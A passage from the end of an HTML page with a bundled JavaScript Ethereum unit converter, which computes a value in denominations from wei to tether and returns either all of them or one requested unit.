                    if (unit !== 'wei') result['wei'] = v.times(new BN(1000000000000000000)).toString(10);
                    if (unit !== 'kwei') result['kwei'] = v.times(new BN(1000000000000000)).toString(10);
                    if (unit !== 'mwei') result['mwei'] = v.times(new BN(1000000000000)).toString(10);
                    if (unit !== 'gwei') result['gwei'] = v.times(new BN(1000000000)).toString(10);
                    if (unit != 'szabo') result['szabo'] = v.times(new BN(1000000)).toString(10);
                    if (unit != 'finney') result['finney'] = v.times(new BN(1000)).toString(10);
                    if (unit != 'ether') result['ether'] = v.times(new BN(1)).toString(10);
                    if (unit !== 'kether') result['kether'] = v.times(new BN(0.001)).toString(10);
                    if (unit !== 'mether') result['mether'] = v.times(new BN(0.000001)).toString(10);
                    if (unit !== 'gether') result['gether'] = v.times(new BN(0.000000001)).toString(10);
                    if (unit !== 'tether') result['tether'] = v.times(new BN(0.000000000001)).toString(10);

                    if (toUnit) {
                        toUnit = toUnit.trim().toLowerCase();
                        if (result[toUnit] === undefined) {
                            throw TypeError('Invalid unit');
                        }

                        return result[toUnit];
                    }

                    return result;
                }

                module.exports = converter;
            }, {
                "bignumber.js": 2
            }]
        }, {}, [1]);
    </script>
</body>

</html>
